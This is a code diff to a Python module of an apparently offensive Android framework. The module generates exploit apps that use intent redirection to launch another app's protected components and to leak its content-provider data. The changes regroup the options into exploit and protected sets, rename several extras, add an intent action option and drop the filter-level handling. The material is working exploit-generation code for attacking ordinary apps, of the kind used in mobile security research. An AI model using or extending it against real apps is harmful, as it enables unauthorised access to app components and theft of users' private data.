@@ -20,22 +20,44 @@ class SherlockModule(App):
 
 
     def register_options(self):
-        option_state.add_options([
-            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
-            OptBool("LEAK_PROVIDER", [True, "Leak content provider", False]),
-            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
-            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
-            OptStr("TARGET_CLASS", [True, "Target class name (Get target class name from the manifest file)"]),
-            OptStr("URL_EXTRA", [True, "String URL extra key"]),
-            OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
-            OptStr("BUNDLE_STRING", [False, "String bundle key"]),
-            OptStr("COMPONENT_CLASS", [True, "Protected component class name"]),
-            OptStr("PROVIDER_URI", [False, "Content provider URI to access"]),
-            OptList("COMPONENT_EXTRA", [False, "Protected component intent extra data"]),
-            OptList("PUT_EXTRA", [False, "Intent extra data"]),
-            OptEnum("FILTER_LEVEL", [True, "Intent URI filter level (0: No filter, 1: Filtered component) (Default: 0)", 0, [0, 1]]),
-            OptEnum("PROVIDER_TYPE", [False, "Content provider type (1: Share content, 2: Access to files)", "", [1, 2]]),
-        ])
+        # option_state.add_options([
+            # OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
+            # OptBool("LEAK_PROVIDER", [True, "Leak content provider", False]),
+            # OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
+            # OptStr("TARGET_PACKAGE", [True, "Target package name"]),
+            # OptStr("TARGET_CLASS", [True, "Target class name (Get target class name from the manifest file)"]),
+            # OptStr("STRING_EXTRA", [True, "String URL extra key"]),
+            # OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
+            # OptStr("BUNDLE_STRING", [False, "String bundle key"]),
+            # OptStr("COMPONENT_CLASS", [True, "Protected component class name"]),
+            # OptStr("PROVIDER_URI", [False, "Content provider URI to access"]),
+            # OptList("COMPONENT_EXTRA", [False, "Protected component intent extra data"]),
+            # OptList("PUT_EXTRA", [False, "Intent extra data"]),
+            # OptEnum("FILTER_LEVEL", [True, "Intent URI filter level (0: No filter, 1: Filtered component) (Default: 0)", 0, [0, 1]]),
+            # OptEnum("PROVIDER_TYPE", [False, "Content provider type (1: Share content, 2: Access to files)", "", [1, 2]]),
+        # ])
+
+        option_state.add_options({
+            "exploit": [
+                OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
+                OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
+                OptStr("TARGET_PACKAGE", [True, "Target package name"]),
+                OptStr("TARGET_CLASS", [True, "Target class name"]),
+                OptStr("ACTION_NAME", [False, "Intent action name"]),
+                OptStr("STRING_EXTRA", [True, "String URL extra key"]),
+                OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
+                OptStr("BUNDLE_STRING", [False, "String bundle key"]),
+                OptList("PUT_EXTRA", [False, "Intent extra data key-value pair (Usage: <key>,<value>;<key>,<value>;..)"]),
+            ],
+            "protected": [
+                OptBool("LEAK_PROVIDER", [True, "Leak content provider [Only possible if URI_ALLOW_UNSAFE flag is configured] (Default: False)", False]),
+                OptEnum("PROVIDER_TYPE", [False, "Content provider type [1: Share content, 2: Access to files]", "", [1, 2]]),
+                OptStr("PROVIDER_URI", [False, "Content provider URI to access"]),
+                OptStr("COMPONENT_CLASS", [True, "Protected component class name"]),
+                OptList("CPUT_EXTRA", [False, "Protected component intent extra data key-value pair (Usage: <key>,<value>;<key>,<value>;..)"]),
+            ]
+        })
+
         self.update_option_status()
 
 
@@ -48,7 +70,7 @@ class SherlockModule(App):
             },
             "via_deeplink": {
                 "pos": ["deeplink_uri"],
-                "neg": ["target_class"]
+                "neg": []
             }
         }
         super().update_option_status(stat_dict, opts)
@@ -57,19 +79,19 @@ class SherlockModule(App):
     def execute(self):
         opts = self.get_options_value()
 
-        filter_level = opts['FILTER_LEVEL']
         via_deeplink = opts['VIA_DEEPLINK']
         leak_provider = opts['LEAK_PROVIDER']
         deeplink_uri = opts['DEEPLINK_URI']
         target_package = opts['TARGET_PACKAGE']
         target_class = opts['TARGET_CLASS']
+        action_name = opts['ACTION_NAME']
         put_extra = opts['PUT_EXTRA']
-        url_extra = opts['URL_EXTRA']
+        string_extra = opts['STRING_EXTRA']
         provider_uri = opts['PROVIDER_URI']
         bundle_extra = opts['BUNDLE_EXTRA']
         bundle_string = opts['BUNDLE_STRING']
         protected_component_class = opts['COMPONENT_CLASS']
-        protected_component_extra = opts['COMPONENT_EXTRA']
+        protected_component_extra = opts['CPUT_EXTRA']
         provider_type = opts['PROVIDER_TYPE']
 
         exploit_activity_name = self.activity_name(self._id, target_package)
@@ -84,8 +106,8 @@ class SherlockModule(App):
         if put_extra != "":
             for extra in put_extra:
                 extras.append([extra[0], f'"{extra[1]}"'])
-        if url_extra != "":
-            extras.append([url_extra, "intentUri"])
+        if string_extra != "":
+            extras.append([string_extra, "intentUri"])
         if bundle_extra != "":
             extras.append([bundle_extra, "bundle"])
 
@@ -103,7 +125,7 @@ class SherlockModule(App):
                 self._template.build_intent(
                     intent_var="target",
                     set_data=f'"{provider_uri}"' if leak_provider else None,
-                    set_selector=([self._package, f"{self._package}.{leak_provider_activity_name}"] if leak_provider else [target_package, protected_component_class]) if filter_level == 1 else None,
+                    set_selector=[self._package, f"{self._package}.{leak_provider_activity_name}"] if leak_provider else [target_package, protected_component_class],
                     put_extra=[[extra[0], f'"{extra[1]}"'] for extra in protected_component_extra] if protected_component_extra != "" else [],
                     set_classname=[self._package, f"{self._package}.{leak_provider_activity_name}"] if leak_provider else [target_package, protected_component_class],
                     set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"] if leak_provider else [],
@@ -113,8 +135,8 @@ class SherlockModule(App):
                 'Bundle bundle = new Bundle();',
                 f'bundle.putString("{bundle_string}", intentUri);' if bundle_string != "" else "",
                 self._template.build_intent(
-                    set_action="android.intent.action.VIEW" if via_deeplink else None,
-                    set_data="intentUri" if not via_deeplink else f'"{deeplink_uri}?{url_extra}=" + Uri.encode(intentUri)',
+                    set_action="android.intent.action.VIEW" if via_deeplink else action_name if action_name != "" else None,
+                    set_data="intentUri" if not via_deeplink else f'"{deeplink_uri}?{string_extra}=" + Uri.encode(intentUri)',
                     put_extra=extras,
                     set_classname=[target_package, target_class] if not via_deeplink else []
                 )
@@ -165,7 +187,7 @@ class SherlockModule(App):
         app = {
             "manifest": manifest,
             "layout": self._template.button_layout(self._id, target_package),
-            "bind_button": self._template.bind_button(self._id, target_package),
+            "bind_button": self._template.bind_button(self._id, target_package, exploit_activity_name),
             "component": component
         }
 
